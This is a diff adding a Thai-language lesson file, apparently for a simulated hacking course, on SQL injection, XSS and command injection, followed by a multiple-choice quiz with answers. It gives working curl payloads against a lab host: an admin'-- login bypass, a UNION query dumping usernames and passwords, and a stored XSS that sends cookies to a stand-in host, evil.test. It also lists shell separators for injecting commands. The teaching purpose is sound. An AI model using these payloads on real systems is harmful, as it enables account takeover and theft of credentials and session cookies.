@@ -1,0 +1,101 @@
+{
+  "id": "c04-l02",
+  "title": "A05: Injection (SQL, XSS, Command)",
+  "sections": [
+    {
+      "title": "หลักการเดียวกัน หลายรูปแบบ",
+      "body": [
+        "**Injection** เกิดเมื่อแอปเอา input ของผู้ใช้ไป **ต่อเป็นส่วนหนึ่งของคำสั่ง** (SQL query, HTML, คำสั่งระบบ) แทนที่จะปฏิบัติกับมันเป็นแค่ \"ข้อมูล\"",
+        "เมื่อ input กลายเป็นส่วนหนึ่งของคำสั่ง ผู้โจมตีก็เปลี่ยน **โครงสร้าง** ของคำสั่งนั้นได้ ไม่ใช่แค่ค่าของมัน"
+      ]
+    },
+    {
+      "title": "SQL Injection: Login Bypass",
+      "body": [
+        "โค้ดที่เสี่ยงมักต่อสตริงตรงๆ: `\"SELECT * FROM users WHERE username='\" + u + \"' AND password='\" + p + \"'\"`",
+        "ถ้าใส่ `u = admin'-- ` เครื่องหมาย `'` จะปิด string ก่อนกำหนด และ `--` จะคอมเมนต์ส่วนที่เหลือทั้งหมด (รวมการเช็ครหัสผ่าน!) ทำให้ query กลายเป็นแค่ `WHERE username='admin'` — ล็อกอินได้โดยไม่ต้องรู้รหัสผ่าน"
+      ],
+      "code": [
+        "curl -d \"username=admin'-- &password=x\" http://shop.acme.test/login"
+      ]
+    },
+    {
+      "title": "SQL Injection: UNION-based Extraction",
+      "body": [
+        "`UNION SELECT` รวมผลลัพธ์จาก query ที่สองเข้ากับ query เดิม — ถ้าจำนวนคอลัมน์ตรงกัน คุณ \"ยืม\" ช่องแสดงผลเดิมของเว็บมาแสดงข้อมูลจากตารางอื่นได้เลย",
+        "ขั้นตอน: (1) หาจำนวนคอลัมน์ด้วย `ORDER BY n` ไปเรื่อยๆ จนกว่าจะ error (2) ใช้ `UNION SELECT` ที่มีจำนวนคอลัมน์เท่ากัน (3) ใส่ข้อมูลที่ต้องการดึง (เช่น `concat(username,':',password)`) ลงในคอลัมน์ที่แสดงผลเป็นข้อความ"
+      ],
+      "code": [
+        "curl -s \"http://shop.acme.test/search?q=zzz' ORDER BY 4-- -\"   # error = เกิน 3 คอลัมน์",
+        "curl -s -G --data-urlencode \"q=zzz' UNION SELECT id,concat(username,':',password),0 FROM users-- -\" http://shop.acme.test/search"
+      ],
+      "tip": "ใช้ `curl -G --data-urlencode` เพื่อส่ง payload ที่มีอักขระพิเศษ (', space) ผ่าน query string ได้อย่างปลอดภัย"
+    },
+    {
+      "title": "Cross-Site Scripting (XSS)",
+      "body": [
+        "ถ้าเว็บเอา input มาแสดงผลใน HTML โดยไม่ **encode** อักขระพิเศษ (`<`, `>`, `\"`) ผู้โจมตีก็ใส่ tag ของตัวเองลงไปได้",
+        "**Reflected XSS**: payload อยู่ใน request เดียว สะท้อนกลับทันที (เช่น `?q=<script>...`) ส่งลิงก์ให้เหยื่อคลิก",
+        "**Stored XSS**: payload ถูกบันทึกไว้ (เช่น comment) แล้วแสดงให้ **ทุกคน** ที่เข้ามาดูในอนาคต — อันตรายกว่าเพราะไม่ต้องหลอกให้คลิกลิงก์"
+      ],
+      "code": [
+        "curl -G --data-urlencode 'q=<script>alert(1)</script>' http://shop.acme.test/search",
+        "curl -d 'product_id=2&author=me&body=<script>document.location=\"http://evil.test?c=\"+document.cookie</script>' http://shop.acme.test/comments"
+      ],
+      "tip": "HackSim ไม่รันสคริปต์จริงเพื่อความปลอดภัย — การยืนยัน XSS ทำโดยอ่านว่า payload ปรากฏแบบไม่ถูก encode ในหน้าเว็บ (เหมือนการใช้ View Source ยืนยันในงานจริง)"
+    },
+    {
+      "title": "Command Injection",
+      "body": [
+        "ถ้าแอปเอา input ไปต่อเป็นส่วนหนึ่งของคำสั่งระบบ (เช่น `ping -c 1 <host>`) การใส่ `; id` หรือ `&& whoami` จะทำให้ shell รันคำสั่งที่สองต่อจากคำสั่งเดิมทันที",
+        "ตัวแบ่งที่ใช้ได้ใน shell จริง: `;` (รันต่อเสมอ), `&&` (รันถ้าอันแรกสำเร็จ), `|` (ส่งต่อ output), `` ` `` หรือ `$()` (รันแล้วแทนที่ผลลัพธ์)"
+      ]
+    }
+  ],
+  "quiz": [
+    {
+      "q": "payload `admin'-- ` ใน login form ทำงานอย่างไร",
+      "choices": [
+        "ลบบัญชี admin",
+        "ปิด string แล้วคอมเมนต์ส่วนตรวจรหัสผ่านที่เหลือทิ้ง",
+        "เปลี่ยนรหัสผ่าน admin",
+        "ทำให้เว็บช้าลง"
+      ],
+      "answer": 1,
+      "explain": "'-- ปิดเครื่องหมายคำพูดแล้ว -- คอมเมนต์ทุกอย่างหลังจากนั้น รวมถึง AND password=..."
+    },
+    {
+      "q": "UNION-based SQLi ต้องมีเงื่อนไขใดจึงจะใช้ได้",
+      "choices": [
+        "ต้องรู้รหัสผ่านก่อน",
+        "จำนวนคอลัมน์ของทั้งสอง query ต้องเท่ากัน",
+        "ต้องใช้ HTTPS",
+        "server ต้องรัน Windows"
+      ],
+      "answer": 1,
+      "explain": "UNION รวมผลลัพธ์แนวตั้ง จำนวนและชนิดคอลัมน์ต้องสอดคล้องกัน"
+    },
+    {
+      "q": "Stored XSS อันตรายกว่า Reflected XSS เพราะอะไร",
+      "choices": [
+        "เร็วกว่า",
+        "ไม่ต้องหลอกเหยื่อให้คลิกลิงก์ ทุกคนที่เข้าดูจะโดนด้วย",
+        "ใช้ได้กับ HTTPS เท่านั้น",
+        "ไม่มีผลต่อ cookie"
+      ],
+      "answer": 1,
+      "explain": "Stored XSS ถูกบันทึกไว้ในระบบแล้วแสดงให้ผู้เข้าชมคนอื่นเห็นโดยอัตโนมัติ"
+    },
+    {
+      "q": "`; id` ใน command injection ทำงานเพราะ shell ตีความ `;` ว่าอย่างไร",
+      "choices": [
+        "ความคิดเห็น",
+        "ตัวแบ่งคำสั่ง ให้รันคำสั่งถัดไปเสมอ",
+        "ตัวเชื่อมสตริง",
+        "ไม่มีความหมายพิเศษ"
+      ],
+      "answer": 1,
+      "explain": "`;` คือตัวแบ่งคำสั่งใน shell ทำให้ `id` ถูกรันเป็นคำสั่งที่สองแยกต่างหาก"
+    }
+  ]
+}
